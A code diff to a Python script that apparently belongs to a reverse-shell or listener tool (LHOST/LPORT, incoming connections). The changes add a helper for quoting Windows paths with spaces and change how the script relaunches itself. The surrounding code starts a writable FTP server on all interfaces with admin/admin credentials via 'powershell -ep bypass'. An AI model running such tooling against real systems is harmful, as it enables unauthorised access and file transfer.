@@ -83,6 +83,18 @@ print('Got connection from', addr)
 #         sys.exit()
 
 
+def escape_dir_spaces_powershell(path):
+    dirs = path.split("\\")
+    for i in range(len(dirs)):
+        if " " in dirs[i]:
+            quoted = "\'" + str(dirs[i]) + "\'"
+            escape = dirs[i] = quoted
+            # print(escape)
+
+    escaped_path = "\\".join(dirs)
+    return escaped_path
+
+
 def start_ftp():
     cmd = "python -m pyftpdlib -i '0.0.0.0' -p 21 -w -u 'admin' -P 'admin'"
     full_cmd = "powershell -ep bypass -Command " + cmd
@@ -109,8 +121,8 @@ def send(conn_obj):
             if LHOST and LPORT is not None:
                 file_name = Path(__file__).name
                 file_path = Path(__file__).parent.absolute()
-                full_path = str(file_path) + "\\" + str(file_name)
-                program = str('cmd start /c "python ' + full_path + ' ' + LPORT + '"').replace("\\", "\\\\")
+                full_path = str(str(file_path) + "\\" + str(file_name)).replace("\\", "\\\\")
+                program = str('cmd start /c "python ' + '""' + full_path + '""' + ' ' + LPORT + '"')
                 # print(program)
                 subprocess.run(program)
 
@@ -126,7 +138,8 @@ def send(conn_obj):
                 file_name = Path(__file__).name
                 file_path = Path(__file__).parent.absolute()
                 full_path = str(file_path) + "\\" + str(file_name)
-                program = str('cmd start /c "python ' + full_path + ' ' + LPORT + '"').replace("\\", "\\\\")
+                PS_formatted_path = escape_dir_spaces_powershell(full_path)
+                program = str('cmd start /c "python ' + PS_formatted_path + ' ' + LPORT + '"')
                 # print(program)
                 subprocess.run(program)
 
